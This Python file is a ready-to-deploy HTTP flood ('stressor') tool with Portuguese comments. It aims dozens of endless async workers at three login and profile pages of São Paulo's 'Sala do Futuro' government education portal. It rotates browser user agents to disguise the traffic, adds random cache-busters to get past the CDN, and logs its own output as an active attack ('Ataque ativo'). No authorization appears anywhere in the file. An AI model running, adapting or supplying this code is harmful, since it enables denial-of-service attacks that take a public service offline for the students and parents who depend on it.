import asyncio
import random
import time
import os
import gc
import sys
import signal
import logging

# --- CONFIGURAÇÃO DE LOGGING ---
# O Render captura stdout/stderr. Configurar logging garante formato consistente.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger("Stressor")

# --- VERIFICAÇÃO DE DEPENDÊNCIAS (Só para rodar localmente antes do deploy) ---
# No Render, o requirements.txt cuida disso.
def ensure_package(package):
    try:
        __import__(package)
    except ImportError:
        log.info(f"Instalando {package}...")
        os.system(f"{sys.executable} -m pip install {package} --quiet")

ensure_package("aiohttp")
import aiohttp

# --- CONFIGURAÇÕES DE ALVOS ---
TARGETS = [
    {
        "name": "Login Alunos",
        "base_url": "https://saladofuturo.educacao.sp.gov.br/login-alunos",
        "payloads": [
            "?redirect=/dashboard&_cb={cb}",
            "?next=/escolha-de-perfil&_cb={cb}",
            "?error=invalid_credentials&_cb={cb}",
            "?_cb={cb}&format=json"
        ]
    },
    {
        "name": "Escolha de Perfil",
        "base_url": "https://saladofuturo.educacao.sp.gov.br/escolha-de-perfil",
        "payloads": [
            "?perfil=aluno&_cb={cb}",
            "?perfil=responsavel&_cb={cb}",
            "?perfil=gov&_cb={cb}",
            "?_cb={cb}&verbose=true"
        ]
    },
    {
        "name": "Login Responsáveis",
        "base_url": "https://saladofuturo.educacao.sp.gov.br/login-responsaveis-gov",
        "payloads": [
            "?redirect=/painel-responsavel&_cb={cb}",
            "?error=access_denied&_cb={cb}",
            "?_cb={cb}&format=json",
            "?auth=ldap&_cb={cb}"
        ]
    }
]

# Leitura de variáveis de ambiente do Render
# Exemplo: Defina WORKERS_PER_TARGET=50 no painel do Render
WORKERS_PER_TARGET = int(os.getenv("WORKERS_PER_TARGET", "25"))
TOTAL_WORKERS = WORKERS_PER_TARGET * len(TARGETS)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

class Stats:
    def __init__(self):
        self.requests = 0
        self.errors = 0
        self.start_time = time.time()
        self.status_codes = {}

    def get_rps(self):
        delta = time.time() - self.start_time
        return self.requests / delta if delta > 0 else 0

    def record_status(self, code):
        self.status_codes[code] = self.status_codes.get(code, 0) + 1

stats = Stats()
stop_event = asyncio.Event()

async def safe_request(session, url, headers, target_name, worker_id):
    """
    Executa a requisição com tratamento robusto de erros de rede.
    """
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            # Leitura obrigatória para liberar o socket de volta ao pool
            await resp.read()
            stats.requests += 1
            stats.record_status(resp.status)
            
            if resp.status >= 400:
                stats.errors += 1

    except asyncio.TimeoutError:
        stats.errors += 1
        # Loga timeouts em massa para diagnosticar latência
        if stats.errors % 100 == 0:
            log.warning(f"[WARN] {target_name} | Timeouts acumulados: {stats.errors}")
            
    except aiohttp.ClientConnectionError as e:
        stats.errors += 1
        # Erros de conexão (refusada, reset, etc)
        if stats.errors % 50 == 0:
            log.warning(f"[WARN] {target_name} | Worker {worker_id} ConnectionError: {e.__class__.__name__}")
    except Exception as e:
        stats.errors += 1
        if stats.errors % 50 == 0:
            log.warning(f"[WARN] {target_name} | Worker {worker_id} Erro inesperado: {type(e).__name__}: {e}")

async def attack_worker(session, target_config, worker_id):
    """
    Worker assíncrono que rotaciona payloads contra um alvo específico.
    """
    base_url = target_config['base_url']
    payloads = target_config['payloads']
    target_name = target_config['name']
    
    headers_base = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Referer': base_url
    }
    
    payload_index = 0
    
    while not stop_event.is_set():
        try:
            headers = headers_base.copy()
            headers['User-Agent'] = random.choice(USER_AGENTS)
            
            # Rotaciona payloads para evitar cache agressivo do CDN
            payload_template = payloads[payload_index % len(payloads)]
            payload_index += 1
            
            # Cache buster dinâmico
            cache_buster = random.randint(100000, 999999)
            url = base_url + payload_template.replace("{cb}", str(cache_buster))
            
            await safe_request(session, url, headers, target_name, worker_id)
            
            # Jitter assíncrono (10-50ms) para evitar thundering herd
            await asyncio.sleep(random.uniform(0.01, 0.05))

        except asyncio.CancelledError:
            break
        except Exception as e:
            if not stop_event.is_set():
                log.error(f"[ERROR] {target_name} | Worker {worker_id} Exceção crítica: {e}")
                await asyncio.sleep(1) # Backoff simples em caso de erro

async def monitor_stats():
    """
    Task de monitoramento: RPS, Erros e Códigos de Status.
    """
    while not stop_event.is_set():
        await asyncio.sleep(5)
        rps = stats.get_rps()
        uptime = int(time.time() - stats.start_time)
        h, r = divmod(uptime, 3600)
        m, s = divmod(r, 60)
        
        # Coleta de lixo manual para evitar vazamento de memória em longas execuções
        gc.collect()
        
        status_str = " | ".join([f"{code}: {count}" for code, count in stats.status_codes.items()])
        
        # Log estruturado para o dashboard do Render
        log.info(f"[STATS] Uptime: {h:02d}:{m:02d}:{s:02d} | RPS: {rps:.2f} | Req: {stats.requests} | Err: {stats.errors} | Status: {status_str}")

async def main():
    log.info(f"[INIT] Iniciando Sala do Futuro Stressor no Render.")
    log.info(f"[INIT] Alvos: {len(TARGETS)}")
    log.info(f"[INIT] Workers por alvo: {WORKERS_PER_TARGET} (Total: {TOTAL_WORKERS})")
    
    # Connector otimizado
    # limit_per_host=100 é um bom equilíbrio para não saturar o FD limit do container
    connector = aiohttp.TCPConnector(
        limit=0, 
        limit_per_host=100, 
        ttl_dns_cache=300,
        enable_cleanup_closed=True
    )
    
    timeout = aiohttp.ClientTimeout(total=20)
    
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = []
        worker_id = 0
        
        for target in TARGETS:
            for _ in range(WORKERS_PER_TARGET):
                tasks.append(asyncio.create_task(attack_worker(session, target, worker_id)))
                worker_id += 1
        
        monitor_task = asyncio.create_task(monitor_stats())
        
        log.info("[INIT] Ataque ativo. Monitorando status...")
        
        try:
            # Loop principal infinito
            while True:
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        finally:
            log.info("[SHUTDOWN] Iniciando encerramento gracioso...")
            stop_event.set()
            monitor_task.cancel()
            # Aguarda todos os workers terminarem suas requisições atuais
            await asyncio.gather(*tasks, return_exceptions=True)
            log.info("[EXIT] Processo encerrado com sucesso.")

# --- HANDLERS DE SINAL PARA PaaS (Render) ---
# O Render envia SIGTERM quando você faz stop ou deploy de nova versão.
# Precisamos garantir que o loop de eventos encerre corretamente.

def handle_shutdown(loop):
    log.info("[SIGNAL] SIGTERM recebido. Encerrando...")
    # O main() já trata o CancelledError, mas garantir que o loop pare é bom prática
    # Se estiver rodando via asyncio.run(), ele já cuida disso.
    # Esta função é útil se estivermos em um contexto mais complexo.

if __name__ == "__main__":
    try:
        # Detecta se estamos em um ambiente Jupyter (Colab) ou Script (Render/CLI)
        # Se for Colab, o usuário pode querer usar await. 
        # Mas como o objetivo é Render (CLI), usamos asyncio.run().
        # Se o usuário quiser testar no Colab, basta copiar o corpo de main() 
        # e usar await main() na célula.
        
        # Verificação heurística para Colab
        in_notebook = "ipykernel" in sys.modules
        
        if in_notebook:
            # No Colab, precisamos de nest_asyncio ou await direto.
            # Para manter o arquivo único e portável, tentamos aplicar nest_asyncio se disponível.
            try:
                import nest_asyncio
                nest_asyncio.apply()
            except ImportError:
                pass # Se não estiver, asyncio.run() falhará no Colab, 
                     # mas funcionará no Render. 
                     # Para Colab, o ideal é usar 'await main()' diretamente na célula.
            
            asyncio.run(main())
        else:
            # No Render/CLI, asyncio.run() é perfeito
            asyncio.run(main())

    except KeyboardInterrupt:
        print("\n[EXIT] Interrompido manualmente (Ctrl+C).", flush=True)
    except Exception as e:
        log.critical(f"[FATAL] Erro crítico não tratado: {e}", exc_info=True)
        sys.exit(1)
